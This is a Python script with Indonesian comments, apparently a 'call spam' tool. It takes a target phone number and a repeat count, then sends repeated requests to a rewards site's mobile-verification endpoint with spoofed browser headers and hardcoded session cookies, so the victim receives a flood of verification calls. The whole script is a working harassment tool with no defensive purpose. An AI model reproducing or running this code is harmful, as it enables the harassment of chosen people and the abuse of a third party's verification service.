﻿import os,sys,time
import requests
import subprocess
from requests import post

#MASUKAN NOMOR DI KOLOM VARIABLE URL
#MASUKAN NOMOR TANPA 62/0
#CONTOH 8938373772 hapus masukin-target-di-sini ganti no target
url = "https://id.jagreward.com/member/verify-mobile/masukin-target-di-sini"

































def bersih():
    os.system("clear")

def balik():
    d = input("\033[1;97mCoba lagi? (y/t): ")
    if d == "y":
       subprocess.call("python call.py",shell=True)
    elif d == "t":
         print ("\033[1;91mExit")
         os.system("exit")
bersih()
subprocess.call("figlet  -f banner MR.414N|lolcat",shell=True)
subprocess.call("figlet  LOVE|lolcat",shell=True)
subprocess.call("figlet  QUEENLIA|lolcat",shell=True)
banner = """
\033[1;97m
\033[1;92m==================================================
\033[1;93mAUTHOR \033[1;91m: \033[1;96mMR.414N
\033[1;93mgithub \033[1;91m:\033[1;96mhttps://github.com/MR414N-ID
\033[1;93mWA \033[1;91m:\033[1;96m6282292838634
\033[1;92m==================================================
"""
print (banner)
jm = int(input("\033[1;97m[\033[1;96mmasukan jumlah spam\033[1;97m]:\033[1;93m"))
time.sleep(2)
subprocess.call("nano call.py",shell=True)
print ("\033[1;92mLoading\033[1;97m...")
time.sleep(2)
head = {
"X-Requested-With": "XMLHttpRequest",
"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
"Content-Type":" application/x-www-form-urlencoded; charset=UTF-8",
"Content-Type": "application/json",
"Origin": "https://id.jagreward.com",
"Referer": "https://id.jagreward.com/member/register/",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
"__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816",
"_ga": "GA1.2.2037151396.1584709855",
"PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc",
"DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0",
}
bro = {
"method": "CALL",
"countryCode": "id",
}
def kirim():
    try:
        for i in range(jm):
            r = requests.get(url,data=bro, headers=head)
            print ("QUEENLIA LOVE", r.json()["result"],"\MR.414N", r.json()["message"])
            time.sleep(3)
    except KeyboardInterrupt:
            print ("\033[1;91mStop!!")

subprocess.call("figlet  -f banner MR.414N|lolcat",shell=True)
subprocess.call("figlet  LOVE|lolcat",shell=True)
subprocess.call("figlet  QUEENLIA|lolcat",shell=True)
    
kirim()
balik()
